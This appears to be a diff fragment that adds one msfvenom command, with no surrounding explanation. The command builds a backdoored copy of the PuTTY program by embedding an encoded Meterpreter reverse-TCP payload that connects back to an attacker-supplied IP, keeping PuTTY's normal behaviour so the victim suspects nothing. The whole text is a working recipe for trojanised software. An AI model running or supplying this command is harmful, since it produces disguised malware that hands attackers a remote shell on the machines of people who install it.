@@ -1,0 +1,8 @@
+msfvenom -x putty_original.exe \
+         -k \
+         -p windows/x64/meterpreter/reverse_tcp \
+         LHOST=<YOUR_KALI_IP> \
+         LPORT=5555 \
+         -e x64/xor_dynamic \
+         -f exe \
+         -o putty_backdoored.exe
